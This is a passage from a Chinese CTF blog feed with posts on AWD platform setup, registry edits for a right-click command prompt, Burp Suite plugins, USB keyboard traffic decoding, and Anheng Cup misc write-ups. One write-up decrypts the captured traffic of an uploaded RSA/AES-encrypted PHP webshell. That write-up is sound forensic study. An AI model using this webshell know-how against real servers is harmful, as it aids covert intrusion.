target="_blank">首页</a><br><a href="http://152.136.119.85:8080/flag_file.php" target="_blank">flag提交</a><br><a href="http://152.136.119.85:8080" target="_blank">积分版</a><br><a href="http://152.136.119.85:8801" target="_blank">靶机</a> </p><h3 id="自己搭建及使用时记录的一个总结"><a href="#自己搭建及使用时记录的一个总结" class="headerlink" title="自己搭建及使用时记录的一个总结"></a>自己搭建及使用时记录的一个总结</h3><p>距离搭建时间过去已经很久了，可能哪里写的不是很对，但还是要记录一下，怕以后自己忘记了怎么搭建<br>然后如果有哪里出现问题欢迎加QQ联系</p><p>每一个靶机都是可以用ssh连接的，如果连接后无法tab补全或者其他问题是正常现象<br>解决办法：输入 /bin/bash<br><img src="/images/AWD%E6%90%AD%E5%BB%BA/Ubuntu-desktop-AWD.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;docker安装&quot;&gt;&lt;a href=&quot;#docker安装&quot; class=&quot;headerlink&quot; title=&quot;docker安装&quot;&gt;&lt;/a&gt;docker安装&lt;/h3&gt;&lt;p&gt;emmmm  我对于这个也不是很了解  大家网上搜索一下吧，有很多教程&lt;br&gt;我搭建时候使用</summary>
      
    
    
    
    
    <category term="AWD" scheme="http://blog.falsectf.top/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>Windwos右键打开cmd</title>
    <link href="http://blog.falsectf.top/2020/05/05/263eb65f.html"/>
    <id>http://blog.falsectf.top/2020/05/05/263eb65f.html</id>
    <published>2020-05-05T13:00:47.000Z</published>
    <updated>2021-02-02T02:33:41.370Z</updated>
    
    <content type="html"><![CDATA[<p>第一次自己安装的时候不知道编码问题会乱码，导致出现了乱码，一定要注意修改文件编码格式！！！</p><h3 id="右键打开cmd"><a href="#右键打开cmd" class="headerlink" title="右键打开cmd"></a>右键打开cmd</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>新建一个txt文档，起名OpenCmdHere.txt</p><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>将下方代码复制进txt文件中，并且保存，保存时文件编码要修改为ANSI，否则会乱码！！！！！<br> 文件 -&gt; 另存为 -&gt; 下方编码选择 -&gt; ANSI -&gt; 保存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\OpenCmdHere]</span><br><span class="line">@=&quot;在此处打开命令窗口&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;cmd.exe&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\OpenCmdHere\command]</span><br><span class="line">@=&quot;cmd.exe /s /k pushd &quot;%V&quot;&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\OpenCmdHere]</span><br><span class="line">@=&quot;在此处打开命令窗口&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;cmd.exe&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\OpenCmdHere\command]</span><br><span class="line">@=&quot;cmd.exe /s /k pushd \&quot;%V\&quot;&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\Drive\shell\OpenCmdHere]</span><br><span class="line">@=&quot;在此处打开命令窗口&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;cmd.exe&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\Drive\shell\OpenCmdHere\command]</span><br><span class="line">@=&quot;cmd.exe /s /k pushd \&quot;%V\&quot;&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\LibraryFolder\background\shell\OpenCmdHere]</span><br><span class="line">@=&quot;在此处打开命令窗口&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;cmd.exe&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\LibraryFolder\background\shell\OpenCmdHere\command]</span><br><span class="line">@=&quot;cmd.exe /s /k pushd \&quot;%V\&quot;&quot;</span><br></pre></td></tr></table></figure><h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p>将OpenCmdHere.txt 文件后缀更改为.reg -&gt;OpenCmdHere.reg<br>然后双击OpenCmdHere.reg，弹出窗口点击确定即可<br>此时鼠标右键空白处就可以看到 <code>在此处打开命令窗口</code></p><h4 id="第四步，解决乱码"><a href="#第四步，解决乱码" class="headerlink" title="第四步，解决乱码"></a>第四步，解决乱码</h4><p>1、 win+r 输入regedit，打开注册表<br>2、 输入路径<code>计算机\HKEY_CLASSES_ROOT\Drive\shell\OpenCmdHere</code><br>3、 在右侧乱码处，右键点击修改，将乱码修改为需要的字符即可<br>4、 再次输入路径<code>计算机\HKEY_CLASSES_ROOT\Directory\Background\shell\OpenCmdHere</code>,重复上诉操作修改即可</p><h4 id="删除右键cmd"><a href="#删除右键cmd" class="headerlink" title="删除右键cmd"></a>删除右键cmd</h4><p>1、 新建txt，将如下代码复制进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[-HKEY_CLASSES_ROOT\Directory\Background\shell\OpenCmdHere]</span><br></pre></td></tr></table></figure><p>2、 保存文件并命名为<code>RemoveCmdHere.reg</code><br>3、 双击<code>RemoveCmdHere.reg</code>，然后一直确定即可</p><h3 id="右键打开Windows-terminal"><a href="#右键打开Windows-terminal" class="headerlink" title="右键打开Windows terminal"></a>右键打开Windows terminal</h3><p>1、 windwos10，打开微软商店搜索<code>windows terminal</code>，然后选择第一个安装<br><img src="/images/Windows_cmd/1.png"><br>2、 启动windows terminal窗口，进入设置页面<br><img src="/images/Windows_cmd/2.png"><br>在文件中添加下方圈上的代码<code>&quot;startingDirectory&quot;: null</code><br>配置文件路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\[username]]\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\profiles.json</span><br></pre></td></tr></table></figure><p><img src="/images/Windows_cmd/3.png"></p><h4 id="右键打开"><a href="#右键打开" class="headerlink" title="右键打开"></a>右键打开</h4><p>首先，下载一个ico的图标，链接：<a href="http://blog.falsectf.top/images/Windows_cmd/wt_32.ico">图标</a><br>然后执行命令<code>mkdir &quot;%USERPROFILE%\AppData\Local\terminal&quot;</code><br>然后将下载好的ico图标放到terminal目录下<br>之后将下方代码复制到新建的txt中，文件名任意，后缀改为reg，下方[username]替换为自己的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\wt]</span><br><span class="line">@=&quot;Windows Terminal&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;%USERPROFILE%\\AppData\\Local\\terminal\\wt_32.ico&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\wt\command]</span><br><span class="line">@=&quot;C:\\Users\\[username]\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe&quot;</span><br></pre></td></tr></table></figure><p>然后双击xxx.reg文件–确定–确定，就可以在右键中看到Windows Terminal啦</p><h4 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h4><p> sudo apt-get install zsh</p><h4 id="将zsh设置为默认shell"><a href="#将zsh设置为默认shell" class="headerlink" title="将zsh设置为默认shell"></a>将zsh设置为默认shell</h4><p> chsh -s /bin/zsh</p><h4 id="将bash设置为默认shell"><a href="#将bash设置为默认shell" class="headerlink" title="将bash设置为默认shell"></a>将bash设置为默认shell</h4><p> chsh -s /bin/bash</p><p>Windows Terminal美化：<a href="https://printempw.github.io/windows-terminal-setup-guide/">https://printempw.github.io/windows-terminal-setup-guide/</a></p><p>参考链接：<a href="https://www.jianshu.com/p/c02f1a4d114c">https://www.jianshu.com/p/c02f1a4d114c</a></p><p>zsh美化 参考链接：<a href="https://zhuanlan.zhihu.com/p/66546598">https://zhuanlan.zhihu.com/p/66546598</a><br>                  <a href="https://zhuanlan.zhihu.com/p/62501175">https://zhuanlan.zhihu.com/p/62501175</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;第一次自己安装的时候不知道编码问题会乱码，导致出现了乱码，一定要注意修改文件编码格式！！！&lt;/p&gt;
&lt;h3 id=&quot;右键打开cmd&quot;&gt;&lt;a href=&quot;#右键打开cmd&quot; class=&quot;headerlink&quot; title=&quot;右键打开cmd&quot;&gt;&lt;/a&gt;右键打开cmd&lt;/h3&gt;</summary>
      
    
    
    
    
    <category term="Windwos" scheme="http://blog.falsectf.top/tags/Windwos/"/>
    
  </entry>
  
  <entry>
    <title>安恒杯2020-4月月赛-misc</title>
    <link href="http://blog.falsectf.top/2020/04/25/d10f.html"/>
    <id>http://blog.falsectf.top/2020/04/25/d10f.html</id>
    <published>2020-04-25T12:41:14.000Z</published>
    <updated>2020-12-31T11:49:24.306Z</updated>
    
    <content type="html"><![CDATA[<h4 id="MISC1-Blueshark"><a href="#MISC1-Blueshark" class="headerlink" title="MISC1-Blueshark"></a>MISC1-Blueshark</h4><p>难度：简单<br>题目描述：Can you dig something you want out from the sea-colored beautiful shark?<br>题目附件：blueshark.pcapng<br>解题思路：<br>1、打开题目后，发现是一个蓝牙协议的流量<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/1.png"><br>看不出什么东西，直接binwalk分析一下，发现存在一个7-zip文件<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/2.png"><br>2、提取压缩包<br>找到7z文件，找到对应的数据，将其提取出来<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/3.png"><br>找到对应的数据，直接导出分组字节流，存储为xx.7z或xx.zip<br>3、打开文件需要密码，说是PIN码，直接在数据包里搜索<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/4.png"><br>密码是141854<br>解密压缩包后得到flag<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/5.png"></p><h4 id="MISC2-Keyboard"><a href="#MISC2-Keyboard" class="headerlink" title="MISC2-Keyboard"></a>MISC2-Keyboard</h4><p>参考<code>Fzwjscj</code>师傅的wp：<a href="http://www.fzwjscj.xyz/index.php/archives/25/#misc3">http://www.fzwjscj.xyz/index.php/archives/25/#misc3</a><br>参考<code>Ga1@xy</code>师傅的wp：<a href="http://www.ga1axy.top/index.php/archives/28/#keyboard">http://www.ga1axy.top/index.php/archives/28/#keyboard</a></p><h4 id="MISC3-AWDshell"><a href="#MISC3-AWDshell" class="headerlink" title="MISC3-AWDshell"></a>MISC3-AWDshell</h4><p>难度：困难<br>题目描述：AWDshell<br>题目附件：awdshell.pcapng<br>解题思路：<br>1、打开流量包后发现大部分都是UDP流量，往下看看会发现存在一些http流量<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/6.png"><br>因为是awdshell，awd肯定是web或者pwn，那么分析一定就是http了，过滤一下<br>这里可以发现访问了upload.php，说明存在文件上传漏洞，追一下http流<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/7.png"><br>找到了上传的php木马，这里是rsa加密流量木马<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/8.png"><br>请求加密数据<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/9.png"><br>返回加密数据<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/10.png"><br>2、解密流量，进行分析<br>发送的流量是rsa加密的，返回流量看起来像base64加密，还不清楚<br>下方是解密脚本，因为发送的是rsa加密流量，根据rsa公钥解密可以获得密文</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;<span class="comment">//密文</span></span><br><span class="line"><span class="variable">$pk</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span></span><br><span class="line"><span class="string">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span></span><br><span class="line"><span class="string">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span></span><br><span class="line"><span class="string">LzrcBi88Eu7oZaPANwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$cmds</span> = explode(<span class="string">&quot;|&quot;</span>, <span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$pk</span> = openssl_pkey_get_public(<span class="variable">$pk</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cmds</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (openssl_public_decrypt(base64_decode(<span class="variable">$value</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> .= <span class="variable">$de</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br></pre></td></tr></table></figure><p>经过逐条查找后发现flag相关的流量在这里，直接对它进行分析即可<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/11.png"><br>3、解密流量，获取flag<br>这是该条流量解密后的流量数据，是一个php脚本<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/12.png"><br>格式美化：<a href="http://www.jsons.cn/phpformat/">http://www.jsons.cn/phpformat/</a><br>格式化后分析一下脚本，发现返回流量是AES加密，头尾会增加垃圾字符<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/13.png"><br>获取返回流量，去除头尾垃圾字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=</span><br></pre></td></tr></table></figure><p>session前16位：<code>hm3pq66843bbbrdg</code></p><p><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/14.png"><br>AES在线解密链接：<a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a><br>在线对数据进行解密，即可拿到flag<br>返回结果是base64，在进行一次base64解密<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/15.png"><br>对数据进行两次base64解密即可拿到flag<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/16.png"></p><h4 id="MISC4-（签到题）6G还远吗？"><a href="#MISC4-（签到题）6G还远吗？" class="headerlink" title="MISC4-（签到题）6G还远吗？"></a>MISC4-（签到题）6G还远吗？</h4><p>难度：入门<br>题目描述：5G都来了，6G还远吗？6G下还需要开会员才能高速下载吗？<br>解题思路：<br>就如同题目的描述一样，你需要冲会员才能下载<br>这道题目根本就没打算要你下载下来近一个G的文件，flag藏在了文件头部<br>点击下载后直接记事本查看头部就可以看到flag了<br><img src="/images/%E5%AE%89%E6%81%92%E6%9D%AF4%E6%9C%88/17.png"></p><h4 id="MISC5-4月月赛题目质量问卷调查"><a href="#MISC5-4月月赛题目质量问卷调查" class="headerlink" title="MISC5-4月月赛题目质量问卷调查"></a>MISC5-4月月赛题目质量问卷调查</h4><p>难度：入门<br>题目描述：送分题XD<br>给了一个链接，是一个调查问卷，进去直接填好后提交就给flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;MISC1-Blueshark&quot;&gt;&lt;a href=&quot;#MISC1-Blueshark&quot; class=&quot;headerlink&quot; title=&quot;MISC1-Blueshark&quot;&gt;&lt;/a&gt;MISC1-Blueshark&lt;/h4&gt;&lt;p&gt;难度：简单&lt;br&gt;题目描述：Can </summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.falsectf.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.falsectf.top/tags/CTF/"/>
    
    <category term="MISC" scheme="http://blog.falsectf.top/tags/MISC/"/>
    
    <category term="安恒杯" scheme="http://blog.falsectf.top/tags/%E5%AE%89%E6%81%92%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>Burpsuite插件</title>
    <link href="http://blog.falsectf.top/2020/04/22/7f9e.html"/>
    <id>http://blog.falsectf.top/2020/04/22/7f9e.html</id>
    <published>2020-04-22T02:25:38.000Z</published>
    <updated>2020-12-31T11:50:16.624Z</updated>
    
    <content type="html"><![CDATA[<h5 id="Reissue-Request-Scripter插件"><a href="#Reissue-Request-Scripter插件" class="headerlink" title="Reissue Request Scripter插件"></a>Reissue Request Scripter插件</h5><p>官方链接：<a href="https://github.com/PortSwigger/reissue-request-scripter">https://github.com/PortSwigger/reissue-request-scripter</a></p><p>下载链接：<a href="https://github.com/h3xstream/http-script-generator/blob/gh-pages/releases/burp/scriptgen-burp-plugin-6.jar?raw=true">https://github.com/h3xstream/http-script-generator/blob/gh-pages/releases/burp/scriptgen-burp-plugin-6.jar?raw=true</a></p><h6 id="功能："><a href="#功能：" class="headerlink" title="功能："></a>功能：</h6><p>可以根据抓取的包自动解析生成各类语言的脚本，非常适合用于AWD比赛一类，省去了脚本框架编写的步骤。</p><h6 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h6><p>下载到本地后是一个.jar的包，需要先打开Burpsuite，然后点击Extender安装插件，详情见下图</p><p><img src="/images/Burpsuite/1.png"></p><p><img src="/images/Burpsuite/2.png"></p><p><img src="/images/Burpsuite/3.png"></p><p>到了这里，我们就已经安装好了，接下来演示如何使用</p><p><img src="/images/Burpsuite/4.png"></p><p><img src="/images/Burpsuite/5.png"></p><p>这里可以选择各类语言的脚本，均可自动生成</p><p><img src="/images/Burpsuite/6.png"></p><p>将生成的脚本copy到对应的运行环境就可以运行辣！！！</p><p>下方是Python3脚本运行结果</p><p><img src="/images/Burpsuite/7.png"></p><h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>这个插件是正在工作中的同学推荐的  感觉是个非常好的插件了，对于AWD比赛中快速编辑批量脚本有很大的帮助，另外没有学习过或者不会写脚本的小伙伴也可以去学习自动生成的脚本，根据其意思学会自己编写脚本。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;Reissue-Request-Scripter插件&quot;&gt;&lt;a href=&quot;#Reissue-Request-Scripter插件&quot; class=&quot;headerlink&quot; title=&quot;Reissue Request Scripter插件&quot;&gt;&lt;/a&gt;Reissue </summary>
      
    
    
    
    <category term="Tools" scheme="http://blog.falsectf.top/categories/Tools/"/>
    
    
    <category term="Burpsuite" scheme="http://blog.falsectf.top/tags/Burpsuite/"/>
    
    <category term="Tools" scheme="http://blog.falsectf.top/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>USB协议流量分析</title>
    <link href="http://blog.falsectf.top/2020/04/15/9593.html"/>
    <id>http://blog.falsectf.top/2020/04/15/9593.html</id>
    <published>2020-04-15T12:53:30.000Z</published>
    <updated>2020-12-31T11:50:24.256Z</updated>
    
    <content type="html"><![CDATA[<p>使用工具：<br>Wireshark<br>Python</p><h1 id="USB键盘流量"><a href="#USB键盘流量" class="headerlink" title="USB键盘流量"></a>USB键盘流量</h1><p>这里讲一讲键盘流量的一个分析原理，暂且不做例题讲解</p><p>区分：键盘流量的变化体现在Leftover Capture Data的8组数据中的第三组</p><p>首先，我们知道可以通过Wireshark工具抓取外接键盘的数据流量。</p><p>那么是如何知道输入了哪些数据的呢？其实有一张键位对照的表格，只要对着表格替换就是键入数据啦。</p><p>下方是一个比较好用的能够区分大小写的脚本，上面的字典内容就是按照键位对照表生成的。</p><p>我们来举个例子，Leftover Capture Data：00002c0000000000</p><p>可以看到上面数据共16个字符，2个字符一组分为8组   00:00:2c:00:00:00:00:00</p><p>可以清晰的看到第三组的数据为击键信息：2c，那么它对应的按键就是<SPACE> 可以在下方字典中找到</p><p>那么为什么可以说下方的脚本可以区分大小写输出键入内容呢？</p><p>原理：当Leftover Capture Data：0<strong>2</strong>002c0000000000  第一组数据第二位为2时，即为大写内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line">normalKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line">    <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line">     <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line">      <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">       <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line">         <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line">         <span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line">         <span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line">         <span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line">         <span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span 